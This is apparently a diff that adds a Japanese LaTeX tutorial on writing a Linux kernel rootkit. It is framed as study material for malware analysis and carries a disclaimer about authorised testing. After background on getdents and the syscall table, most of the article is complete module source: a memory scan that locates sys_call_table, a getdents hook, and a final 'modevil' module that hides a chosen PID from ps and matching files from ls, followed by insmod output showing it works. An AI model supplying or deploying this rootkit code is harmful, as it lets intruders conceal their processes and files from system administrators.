@@ -1,0 +1,584 @@
+\documentclass{jsarticle}
+\usepackage[dvipdfmx]{graphicx}
+\usepackage{listings}
+
+% 著者
+\title{ルートキットを自作しよう}
+\author{ptr-yudai}
+\date{\today}
+
+\begin{document}
+
+%%
+%% 概要
+%%
+\section{概要}
+本記事では、Linux(x64)においてプロセス隠蔽およびファイル隠蔽をするルートキットを作成する．
+ルートキットとは，カーネルと呼ばれるシステムレベルの領域で動作するプログラムで，一般的に攻撃者がマルウェアや自身の存在を管理者から隠すために使われるツールである．
+ルートキットはシステム権限で動作するため強力で，プロセス隠蔽やファイル隠蔽，また特定の通信をパケットキャプチャに取得させないようにするなど，様々な機能が搭載されている．
+そこで，本記事ではカーネルモジュールを作成し，システムコールをフックすることでプロセスおよびファイルを隠蔽するような簡単なルートキットを作ってみる．
+
+%%
+%% 注意
+%%
+\section{注意}
+  \subsection{読者へのお願い}
+  本記事では悪用できる技術について説明するが、法律で許可される範囲で実験するように注意されたい。また、本記事はそのような行為を助長するためでなく、この分野がマルウェア解析などで重要であり、またスキルアップのための題材として優れていると考えたため記事とした。実際に試す場合は、必ず権限のあるコンピュータ上で試すこと。
+  \subsection{本記事の対象者}
+  本記事を読むだけでシステムフックの手法について十分に理解することは難しいかもしれないが、分からない部分はインターネットで調べながら読んでほしい。その上で、次のような方は少し理解しやすいかもしれない。
+  \begin{itemize}
+  \item Linuxに慣れ親しんでいる
+  \item C言語がある程度読める（特にポインタ）
+  \item カーネルモジュールやデバイスドライバを作ったことがある
+  \item システムコールを理解している
+  \item リングプロテクションを理解している
+  \end{itemize}
+
+%%% 改ページ
+\newpage
+
+%%
+%% 原理
+%%
+\section{原理}
+  \subsection{psの仕組み}
+  Linuxを長年使って来た人ならpsコマンドの存在は当たり前のものだと思うが，その仕組みは広く知られていない．
+  psとは，Linux上で動作しているユーザーアプリケーション（プロセス）の一覧を表示してくれるプログラムである．
+  例えば次のように，プログラムの実行者，ID，実行日時などが分かる．
+  \\
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ptr@ptr ~]$ ps aux 
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0 191312  4424 ?        Ss   02/19   0:01 /usr/lib/systemd/...
+root         2  0.0  0.0      0     0 ?        S    02/19   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    02/19   0:00 [ksoftirqd/0]               
+... 省略 ...
+ptr       2537  0.0  0.0 116984  3624 pts/2    Ss+  02/19   0:00 /bin/bash
+  \end{lstlisting}
+  この例では，ユーザーptrがプログラム/bin/bashを動かしていることなどが見て分かる．
+  psの挙動をstraceなどを使って見ると，次のような動作が見つかる．
+  \\
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ptr@ptr ~]$ strace ps
+... 省略 ...
+openat(AT_FDCWD, "/proc", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 5
+mmap(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = ...
+mmap(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = ...
+getdents(5, /* 308 entries */, 32768)   = 7816
+stat("/proc/1", {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
+open("/proc/1/stat", O_RDONLY)          = 6
+read(6, "1 (systemd) S 0 1 1 0 -1 4202752"..., 1024) = 202
+close(6)
+... 省略 ...
+  \end{lstlisting}
+  openatシステムコールで/procを開いた後，getdentsシステムコールでその中にあるファイルおよびディレクトリの一覧を参照している．
+  /proc以下には起動している全てのプロセスに関する情報が記録されている．
+  例えばプロセスID(以降PID)が2537のプロセスに関する情報は，/proc/2537以下に書かれている．
+  このように，psは/proc以下のファイルを参照するという，一見原始的な方法でプロセス一覧を取得している．
+
+  \subsection{lsの仕組み}
+  lsもpsと同じく，getdentsを使用する．
+  getdentsでディレクトリ内のファイル一覧を取得し，それを表示しているのである．
+
+  \subsection{getdentsの仕様}
+  前節ではpsがgetdentsを利用していることが分かった．
+  では，getdentsの仕様について見ていこう．
+  getdentsのシステムコールの定義は次のようになっている．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+  \end{lstlisting}
+  fdはファイルディスクリプタで，open関数により取得される番号である．
+  countはメモリ領域のサイズである．
+  重要なのはdirpであるが，dirent構造体は次のように定義される．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+struct dirent
+{
+    long d_ino;                 /* inode number */
+    off_t d_off;                /* offset to next dirent */
+    unsigned short d_reclen;    /* length of this dirent */
+    char d_name [NAME_MAX+1];   /* filename (null-terminated) */
+}
+  \end{lstlisting}
+  dirent構造体は1つのファイルに関する情報と，次のdirentまでのオフセットが書かれている．
+  d\_offを使ってもd\_reclenを使っても次のdirentのアドレスは計算できる．
+  なお，getdents64というシステムコールもあるが，本記事ではそちらは対応しない．
+  構造体がlinux\_dirent64を取ることに注意すれば，同じ方法でフックできるので興味のある方は試してほしい．
+
+  \subsection{システムコール}
+  ユーザーアプリケーションがシステムに関する処理をしたいとき，いくつかの問題がある．
+  ファイルからデータを読む処理を例に考えてみよう．
+  まず，一般的にユーザーアプリケーションはring3と呼ばれる最も権限の少ない領域に所属している．
+  したがって，ハードディスクからファイルを読もうとしても，デバイスにアクセスする権限がない．
+  次に，いろんなアプリケーションがファイルをディスクから読む処理を書いてしまうと，プログラマーからすれば非常に面倒である．
+  このような観点から，OSにはシステムコールという機能が存在する．
+  OSはファイルの読み書きやメモリの確保などの，よく使われる機能や権限を要する機能をシステムコールとしてユーザーアプリケーションに提供する．
+  ユーザーアプリケーションは番号や引数など必要な情報を渡してシステムコールを呼び出せば，OSカーネル側でその処理を完了してくれる．
+  システムコールはsyscall命令で呼び出せるが，使いたい機能はシステムコール番号により区別される．
+  そして，カーネルはその番号ごとに，ある番号の機能が呼び出されたらどこに処理を移せばいいかを書いた表を持っている．
+  これをシステムコールテーブルと呼ぶ．
+  Linuxにおいてシステムコールテーブルは次のように定義されている．（kernel/sys.c）
+  \\
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+... 省略 ...
+#undef __SYSCALL
+#define __SYSCALL(nr, call) [nr] = (call),
+void *sys_call_table[NR_syscalls] = {
+        [0 ... NR_syscalls-1] = sys_ni_syscall,
+#include <asm/unistd.h>
+};
+  \end{lstlisting}
+  定義の段階では単にエラーを返す処理が書かれた関数sys\_ni\_syscallが記載されるが，このテーブルには後で正しいシステムコールに直される．
+  したがって，このシステムコールエントリを書き換えることができれば，そのシステムコールが呼ばれた時点で任意の処理を実行できる．
+  しかし，ルートキットなど悪意のあるプログラムにこれを利用させないために，OS側はこの変数をエクスポートできなくして対策してある．
+  この問題の回避方法については，次節で述べる．
+  また，ディストリビューションによっては読み取り専用になっているが，本実験で使用したカーネルでは書き込むことができた．
+  読み取り先頭になっている場合はchange\_page\_attrなどを使って書き込み可能にしてやればよい．
+
+  \subsection{プロセスおよびファイル隠蔽の構想}
+  本節ではモジュールからプロセス隠蔽を実現するための手法について説明する．
+  今回は，システムコールテーブルのフックによりプロセスおよびファイルを隠蔽する．
+  ps, lsが使っているgetdentsなどもシステムコールである．
+  そのため，システムコールが呼び出されたとき，こちら側で作ったコードを実行できれば処理を改竄できる．
+  getdentsのシステムコールテーブルを変更し，用意したコードが呼び出されるようにフックすれば，ps, lsに特定のファイルの存在を伝えないように処理できる．
+  しかし，システムコールテーブルはエクスポートできないため，単純にexternなどで記述してもアドレスは分からない．
+  したがって，システムコールテーブルのアドレスを何とかして探し当てる必要がある．
+  一般的にはページの先頭からsys\_call\_tableのアドレスを愚直に探していく．
+  アドレスをPAGE\_OFFSETから徐々に大きくしていき，毎回そのアドレスがsys\_call\_tableだと仮定していく．
+  そこで，例えばsys\_closeにあたるエントリのポインタが正しくsys\_closeを指していれば，そこがsys\_call\_tableだと分かる．
+  詳しいコードは実験の過程で記述するが，sys\_call\_tableの場所さえ分かればgetdentsをフックできる．
+  sys\_call\_tableは読み取り専用になっていることが多いので，その場合に対応するためページの書き込みフラグをONにするのが望ましいが，本実験ではこの処理は書かない．
+  getdentsをフックしたら，その処理を変更する必要がある．
+  本記事では，通常のgetdents処理を先に呼び出し，その結果を改竄するという方針でルートキットの機能を実現する．
+  
+\newpage
+
+%%
+%% 実験
+%%
+\section{実験}
+  \subsection{実験環境}
+  本記事ではIntel x64で動作するCentOS 7.4を対象にプログラムを書く．
+  しかし，Linuxであれば同じ手法で動作できる．
+  また，x86ではシステムコールテーブルのアドレスに注意すれば，これも同じ手法で動作する．
+  本記事で作成したソースコードは以下から閲覧およびダウンロードできる．
+  
+  
+  %%
+  %% カーネルモジュールのコンパイル
+  %%
+  \subsection{カーネルモジュールのコンパイル}
+  本節では，Linux上で動作する簡単なカーネルモジュールを作り，コンパイルおよびインストールする．
+  カーネルモジュールは，よりOSに近いアプリケーションで，システムレベルの権限を持っている．
+  ルートキットは一般に，カーネルモジュールとしてロードされることでプロセス，ファイル，通信などの隠蔽をする．
+  早速，次のコードmodhello.cを書く．(modhello.c)
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+
+/*
+ * モジュール初期化
+ */
+int init_module(void)
+{
+  printk(KERN_INFO "modhello: init\n");
+  return 0;
+}
+
+/*
+ * モジュール解放
+ */
+void cleanup_module(void)
+{
+  printk(KERN_INFO "modhello: exit\n");
+}
+  \end{lstlisting}
+  C言語に慣れている人であれば，デバイスドライバに親しくない人でも内容は分かるだろう．
+  コンパイルを楽にするために，次のようなMakefileを作る．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+obj-m += modhello.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+  \end{lstlisting}
+  始めのobj-mには，生成されるオブジェクトファイルの名前を書く．
+  makeコマンドを実行すると，コンパイルが成功すれば拡張子が''.ko''のファイルができる．
+  モジュールは次のように，root権限でインストールおよびアンインストールできる．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ptr@ptr modhello]# insmod modhello.ko
+[ptr@ptr modhello]# rmmod modhello
+  \end{lstlisting}
+  特に何も表示されなければ上手く動作している．
+  printkで出力した内容はdmesgで表示できる．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ 5901.346064] modhello: init
+[ 5908.208209] modhello: exit
+  \end{lstlisting}
+
+  %%
+  %% システムコールのフック
+  %%
+  \subsection{システムコールのフック}
+  本節では，Linuxのシステムコールをフックする最も簡単なコードを作る．
+  目標は，getdentsが呼ばれたらprintkにより適当なメッセージを出力し，その後本来の処理に戻すことである．
+  まず，sys\_call\_tableのアドレスを取得するコードを以下に示す．(gettable.cの一部)
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+static unsigned long **find_sys_call_table(void)
+{
+  unsigned long offset;
+  unsigned long **sct;
+  
+  // PAGE_OFFSET から探索
+  for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
+    // 仮に offset が sys_call_table の先頭だとする
+    sct = (unsigned long**)offset;
+    // __NR_close 番目のポインタが sys_close であれば一致
+    if(sct[__NR_close] == (unsigned long*) sys_close) {
+      printk(KERN_INFO "gettable: Found sys_call_table at 0x%lx", (unsigned long)sct);
+      return sct;
+    }
+  }
+  
+  printk(KERN_INFO "gettable: Found nothing");
+  return NULL;
+}
+  \end{lstlisting}
+  ロードすると，次のようにアドレスが出力されることが分かる．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ 4809.038674] gettable: Found sys_call_table at ffff8800016c6ee0
+  \end{lstlisting}
+  ちなみにroot権限で次のコマンドを実行しても，sys\_call\_tableのアドレスを表示できる．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ptr@ptr gettable]# cat /boot/System.map-$(uname -r) | grep sys_call_table
+ffffffff816c6ee0 R sys_call_table
+ffffffff816cdf80 R ia32_sys_call_table
+  \end{lstlisting}
+  一見してdmesgの出力とアドレスが違うが，これはページングが原因である．
+  ページングでは物理アドレスに対して複数の仮想アドレスを割り当てるため，同じ変数でも複数の仮想アドレスを持っていることがある．
+  実際に\_\_phys\_addr\_nodebugという仮想アドレスを物理アドレスに変換する関数を通すと，2つのアドレスは同じになる．
+  sys\_call\_tableのアドレスが分かったので，早速getdentsをフックするコードを以下に示す．(firsthook.c)
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/unistd.h>
+#include <linux/syscalls.h>
+#include <linux/semaphore.h>
+#include <asm/cacheflush.h>
+
+void **sys_call_table;
+
+// 古い getdents のアドレス
+asmlinkage long (*original_getdents)
+(unsigned int, struct linux_dirent __user*, unsigned int);
+// 新しい getdents の宣言
+asmlinkage long hacked_getdents(
+				unsigned int fd,
+				struct linux_dirent __user *dirent,
+				unsigned int count
+				)
+{
+  printk(KERN_INFO "firsthook: Hacked getdents is called!\n");
+  return original_getdents(fd, dirent, count);
+}
+
+/*
+ * sys_call_table のアドレスを探す
+ */
+static unsigned long **find_sys_call_table(void)
+{
+  unsigned long offset;
+  unsigned long **sct;
+  
+  // PAGE_OFFSET から探索
+  for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
+    // 仮に offset が sys_call_table の先頭だとする
+    sct = (unsigned long**)offset;
+    // __NR_close 番目のポインタが sys_close であれば一致
+    if(sct[__NR_close] == (unsigned long*) sys_close) {
+      printk(KERN_INFO "firsthook: Found sys_call_table at 0x%lx", (unsigned long)sct);
+      return sct;
+    }
+  }
+  
+  printk(KERN_INFO "firsthook: Found nothing");
+  return NULL;
+}
+
+/*
+ * システムコールエントリを変更
+ */
+void modify_syscall(void)
+{
+  // sys_call_table のアドレスを取得
+  sys_call_table = (void**)find_sys_call_table();
+  // 元の getdents を保持
+  original_getdents = sys_call_table[__NR_getdents];
+  // 新しい getdents に変更
+  sys_call_table[__NR_getdents] = hacked_getdents;
+}
+
+/*
+ * モジュール初期化
+ */
+int init_module(void)
+{
+  printk(KERN_INFO "firsthook: init\n");
+
+  modify_syscall();
+  
+  return 0;
+}
+
+/*
+ * モジュール解放
+ */
+void cleanup_module(void)
+{
+  printk(KERN_INFO "firsthook: exit\n");
+
+  // 変更を元に戻す
+  sys_call_table[__NR_getdents] = original_getdents;
+}
+  \end{lstlisting}
+  ロードした後にpsコマンドを実行すると，次のようにフックに成功していることが分かる．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ 7561.713515] firsthook: init
+[ 7566.751401] firsthook: Hacked getdents is called!
+[ 7566.759074] firsthook: Hacked getdents is called!
+[ 7572.465819] firsthook: Hacked getdents is called!
+... 省略
+  \end{lstlisting}
+  また，psコマンドの結果は正常なので，フック後に元の処理に戻れていることも分かった．
+
+  %%
+  %% getdentsの改造
+  %%
+  \subsection{getdentsの改造}
+  本節では，getdentsの処理を変更して，特定の情報をpsおよびlsに表示させないようにする．
+  早速，完成したコードを以下に示す．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/unistd.h>
+#include <linux/syscalls.h>
+#include <linux/sched.h>
+
+MODULE_AUTHOR("ptr-yudai");
+MODULE_DESCRIPTION("Hook getdents syscall");
+
+void **sys_call_table;
+
+struct linux_dirent {
+  unsigned long  d_ino;
+  unsigned long  d_off;
+  unsigned short d_reclen;
+  char           d_name[1];
+};
+
+static int pid = 0;
+static char *filename = "!filename!";
+module_param(pid, int, 0);
+MODULE_PARM_DESC(pid, "Process ID to hide");
+module_param(filename, charp, S_IRUGO | S_IWUSR);
+MODULE_PARM_DESC(filename, "Filename to hide");
+
+// 古い getdents のアドレス
+asmlinkage long (*original_getdents)
+(unsigned int, struct linux_dirent*, unsigned int);
+
+/*
+ * オリジナル atoi
+ * PID 用なので負数には非対応
+ */
+int myatoi(char *str) {
+    int num = 0;
+    while(*str != '\0') {
+      if (*str < '0' || *str > '9') {
+	return -1;
+      }
+      num += *str - '0';
+      num *= 10;
+      str++;
+    }
+    num /= 10;
+    return num;
+}
+
+// 新しい getdents の宣言
+asmlinkage long hacked_getdents(
+				unsigned int fd,
+				struct linux_dirent *dirp,
+				unsigned int count
+				)
+{
+  long res;
+  char *ptr = (char*)dirp;
+  struct linux_dirent *curr;
+  char *src, *dst;
+  long len;
+
+  //printk(KERN_INFO "modevil: Hacked getdents is called!\n");
+
+  res = (*original_getdents)(fd, dirp, count);
+  
+  // 失敗したらそのまま終了
+  if ((!res) || (res == -1)) {
+    return res;
+  }
+  
+  while(ptr < (char *)dirp + res) {
+    curr = (struct linux_dirent *)ptr;
+    // 1. modevil を含むファイルは表示しない
+    // 2. pid の数字が名前のファイルは表示しない
+    if (strstr(curr->d_name, filename) != NULL ||
+	myatoi(curr->d_name) == pid) {
+      printk(KERN_INFO "modevil: Found target!\n");
+      // 全体のサイズからこのエントリを減算
+      res -= curr->d_reclen;
+      // それ以降のエントリを詰める
+      src = ptr + curr->d_reclen;
+      dst = ptr;
+      for(len = res; len > 0; --len) {
+	*(dst++) = *(src++);
+      }
+      continue;
+    }
+
+    // 次のエントリへ
+    ptr += curr->d_reclen;
+  }
+
+  return res;
+}
+
+/*
+ * sys_call_table のアドレスを探す
+ */
+static unsigned long **find_sys_call_table(void)
+{
+  unsigned long offset;
+  unsigned long **sct;
+  
+  // PAGE_OFFSET から探索
+  for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
+    // 仮にoffsetがsys_call_tableの先頭だとする
+    sct = (unsigned long**)offset;
+    // __NR_close 番目のポインタが sys_close であれば一致
+    if(sct[__NR_close] == (unsigned long*) sys_close) {
+      printk(KERN_INFO "modevil: Found sys_call_table at 0x%lx", (unsigned long)sct);
+      return sct;
+    }
+  }
+  
+  printk(KERN_INFO "modevil: Found nothing");
+  return NULL;
+}
+
+/*
+ * システムコールエントリを変更
+ */
+void modify_syscall(void)
+{
+  // sys_call_table のアドレスを取得
+  sys_call_table = (void**)find_sys_call_table();
+  // 元の getdents を保持
+  original_getdents = sys_call_table[__NR_getdents];
+  // 新しい getdents に変更
+  sys_call_table[__NR_getdents] = hacked_getdents;
+}
+
+/*
+ * モジュール初期化
+ */
+int init_module(void)
+{
+  printk(KERN_INFO "modevil: Hello!\n");
+
+  modify_syscall();
+  
+  return 0;
+}
+
+/*
+ * モジュール解放
+ */
+void cleanup_module(void)
+{
+  printk(KERN_INFO "modevil: See you!\n");
+
+  // 変更を元に戻す
+  sys_call_table[__NR_getdents] = original_getdents;
+}
+  \end{lstlisting}
+  このモジュールは，引数pidおよびfilenameを取る．
+  getdentsの結果からファイル名を取得し，それがpidで指定した数値であれば隠蔽する．
+  これはpsの仕組みで説明したように，psは/proc/1111などのプロセスIDが書かれたファイルを読むためである．
+  次に，ファイル名にfilenameを含むものを隠蔽する．
+  これによりlsなどから特定の文字列を含むファイルが隠蔽できる．
+  このモジュールを使った結果を以下に示す．
+  \begin{lstlisting}[basicstyle=\ttfamily\footnotesize, frame=single]
+[ptr@ptr modevil]$ ls
+Makefile  Module.symvers  modevil.c  modevil.ko  modevil.mod.c  modevil.mod.o  modevil.o  modules.order
+[ptr@ptr modevil]$ ps
+  PID TTY          TIME CMD
+ 2681 pts/2    00:00:00 bash
+17112 pts/2    00:00:00 ps
+32660 pts/2    00:00:45 emacs
+[ptr@ptr modevil]$ sudo insmod modevil.ko pid=2681 filename=modevil
+[ptr@ptr modevil]$ ls
+Makefile  Module.symvers  modules.order
+[ptr@ptr modevil]$ ps
+  PID TTY          TIME CMD
+17142 pts/2    00:00:00 ps
+32660 pts/2    00:00:45 emacs
+[ptr@ptr modevil]$ sudo rmmod modevil
+[ptr@ptr modevil]$ ls
+Makefile  Module.symvers  modevil.c  modevil.ko  modevil.mod.c  modevil.mod.o  modevil.o  modules.order
+[ptr@ptr modevil]$ ps
+  PID TTY          TIME CMD
+ 2681 pts/2    00:00:00 bash
+17152 pts/2    00:00:00 ps
+32660 pts/2    00:00:46 emacs
+[ptr@ptr modevil]$ 
+  \end{lstlisting}
+  insmodでpidとfilenameを引数として渡すことで，そのpidをpsから，filenameをlsから表示できなくしている．
+  また，rmmodの後には結果が元に戻っているので，解放処理も正しく実装できていることが分かる．
+
+  %%
+  %% まとめ
+  %%
+  \subsection{まとめ}
+  今回は時間が少なかったため簡易的とはいえ，正しく動作するルートキットを作成することができた．
+  実際にはページの権限変更や，キャッシュへの対応など，より細かい挙動を設定しなくてはならない．
+  また，システムコールのフックに成功すれば，ルートキットのみならず，より低いレイヤでのデバッグをしたり，気にくわない挙動を変更するパッチを当てたりと応用できる．
+  C言語を勉強していても普通の人にとってカーネルモジュールを作る機会はほとんど無いと思う．
+  この記事を読んだ方には，カーネルモジュールやルートキットの面白さを知ってもらえれば幸いである．
+
+  \begin{thebibliography}{99}
+  \bibitem{b_0} ``The Linux Kernel Module Programming Guide'', (2018/02/19)\\
+    http://www.tldp.org/LDP/lkmpg/2.6/html/lkmpg.html
+  \bibitem{b_a} ``Malicious Linux modules'', (2018/02/19)\\
+    https://www.redhat.com/archives/linux-security/1997-October/msg00011.html
+  \bibitem{b_b} ``Rootkit module in Linux Kernel 3.2'', (2018/02/19)\\
+    http://dandylife.net/blog/archives/304
+  \bibitem{b_c} ``Linux Kernel: System call hooking example - Stack Overflow'', (2018/02/20)\\
+    https://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example
+  \bibitem{b_d} ``Kernel sys\_call\_table address does not match address specified in system.map - Stack Overflow'', (2018/02/20)\\
+    https://stackoverflow.com/questions/31396090/kernel-sys-call-table-address-does-not-match-address-specified-in-system-map
+  \bibitem{b_e} ``Syscall Hijacking: Dynamically obtain syscall table address (kernel 2.6.x)'', (2018/02/20)\\
+    https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/
+  \bibitem{b_f} Linuxソースコード from Bootlin\\
+    https://elixir.bootlin.com/linux/v4.9/source
+  \end{thebibliography}
+\end{document}
+
+% 
+% http://www.tldp.org/LDP/lkmpg/2.6/html/x323.html
+% 
+% 
